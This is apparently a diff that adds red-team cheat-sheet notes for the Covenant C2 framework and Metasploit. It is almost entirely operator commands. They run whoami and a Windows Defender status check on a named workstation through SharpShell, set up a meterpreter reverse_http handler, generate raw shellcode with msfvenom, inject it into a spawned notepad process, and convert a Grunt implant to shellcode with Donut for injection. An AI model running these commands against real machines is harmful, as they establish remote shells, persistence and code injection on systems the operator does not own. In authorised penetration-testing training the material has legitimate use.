@@ -1,0 +1,44 @@
+#Maintain Presence
+Set Delay 3600
+sleep 3600 10
+
+#SharpShell
+SharpShell return "Hola mundo"; 
+SharpShell return Host.GetHostname (); 
+SharpShell return Shell.PowerShellExecute ("whoami"); 
+SharpShell var defender = SCM.GetService ("wkstn-4945", "WinDefend"); return defender.Status.ToString (); 
+
+#Session Passing
+Make msfvenom
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_http
+msf5 exploit(multi/handler) > set LHOST tun0
+msf5 exploit(multi/handler) > set LPORT 8080
+msf5 exploit(multi/handler) > set EXITFUNC thread
+msf5 exploit(multi/handler) > set EXITONSESSION false
+run -j
+msfvenom -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=8080 EXITFUNC=thread -f raw -o /tmp/msf.bin
+now covenant
+copy using pscp -P 22 kali@kali:/tmp/msf.bin 
+sharpshell var target = System.Diagnostics.Process.Start("notepad"); return target.Id.ToString();
+1234
+Inject /processid:"1234"
+
+#DONUT
+C:\tools\donut\donut.exe HTTPGrunt.exe -e1 -a2 -b1 -f1 -x1 -o HTTPGrunt.bin
+pscp -P 22 HTTPGrunt.bin kali@kali:/tmp/.
+use post/windows/manage/shellcode_inject
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
